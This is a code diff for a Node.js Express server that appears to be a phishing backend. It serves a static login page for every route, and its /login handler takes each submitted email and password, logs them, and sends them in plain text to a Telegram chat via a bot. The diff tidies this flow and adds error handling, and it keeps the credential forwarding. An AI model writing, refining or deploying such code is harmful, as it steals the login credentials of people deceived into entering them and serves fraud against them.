@@ -6,38 +6,51 @@ const TelegramBot = require("node-telegram-bot-api");
 const app = express();
 const port = process.env.PORT || 8080;
 
-// Telegram bot token
+// Ensure Telegram Bot Token & Chat ID exist
+if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
+  console.error("ERROR: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing.");
+  process.exit(1); // Stop server if required env variables are missing
+}
+
 const botToken = process.env.TELEGRAM_BOT_TOKEN;
 const chatId = process.env.TELEGRAM_CHAT_ID;
-
-// Create a new instance of the Telegram bot
 const bot = new TelegramBot(botToken, { polling: false });
 
-// Parse incoming request bodies
+// Middleware to parse incoming request bodies
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
 
-// Serve static files from the 'public' directory
-app.use(express.static(__dirname));
+// Serve static files from the 'public' folder
+app.use(express.static(path.join(__dirname, "public")));
 
 // Handle login request
-app.post("/login", (req, res) => {
-  const email = req.body.email;
-  const password = req.body.password;
+app.post("/login", async (req, res) => {
+  try {
+    const { email, password } = req.body;
+    
+    if (!email || !password) {
+      return res.status(400).json({ error: "Missing email or password" });
+    }
 
-  // Send the login credentials to the Telegram bot
-  const message = `Received login credentials:\nEmail: ${email}\nPassword: ${password}`;
-  bot.sendMessage(chatId, message);
+    console.log("Login attempt:", email, password);
 
-  res.sendStatus(200); // Send success response to the client
+    // Send login credentials to Telegram bot
+    const message = `🔑 Login Attempt:\n📧 Email: ${email}\n🔒 Password: ${password}`;
+    await bot.sendMessage(chatId, message);
+
+    res.status(200).json({ message: "Login data sent successfully!" });
+  } catch (error) {
+    console.error("Error handling login:", error);
+    res.status(500).json({ error: "Internal Server Error" });
+  }
 });
 
-// Serve index.html for any requested route
+// Serve index.html for all unknown routes
 app.get("*", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// Start the server
+// Start server
 app.listen(port, () => {
-  console.log(`Server is running on http://localhost:${port}`);
+  console.log(`✅ Server is running on http://localhost:${port}`);
 });
